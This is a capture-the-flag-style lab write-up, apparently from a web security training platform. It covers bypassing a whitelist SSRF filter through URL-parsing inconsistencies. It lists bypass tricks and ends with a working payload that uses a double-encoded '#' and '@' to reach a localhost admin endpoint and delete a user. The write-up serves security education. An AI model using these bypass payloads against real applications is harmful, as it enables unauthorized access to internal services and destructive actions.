# Lab: SSRF with whitelist-based input filter

## Description
This lab has a stock check feature with a whitelist-based filter. We need to find a way to include our target URL while satisfying the whitelist requirements.

## Analysis
The filter likely checks if the URL contains a specific domain (e.g., `stock.weliketoshop.net`).
We can try to exploit URL parsing inconsistencies:
- Using the `@` character: `http://expected-domain.com@actual-target.com`
- Using fragments: `http://actual-target.com#expected-domain.com`
- Using subdomains: `http://expected-domain.com.actual-target.com`

In this lab, the `@` character works, but we need to combine it with a fragment to hide the rest of the string from the internal parser while keeping the whitelist check satisfied.

## Exploitation
I'll use the `@` and `#` characters to bypass the whitelist.

### Steps
1. Intercept the stock check request.
2. Try `http://localhost@stock.weliketoshop.net`.
3. If that's blocked, try double URL encoding the `#` character to ensure it's processed correctly by the final parser: `http://localhost%23@stock.weliketoshop.net`.
4. The final payload: `http://localhost:80%2523@stock.weliketoshop.net/admin`.
   - The whitelist sees `stock.weliketoshop.net`.
   - The parser sees `localhost:80`.

## Payload
```text
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

## Takeaways
- Whitelists are better than blacklists, but they can still be bypassed if the URL parsing logic is inconsistent between the filter and the actual request maker.
- Understanding how different components parse URLs is key to finding SSRF bypasses.
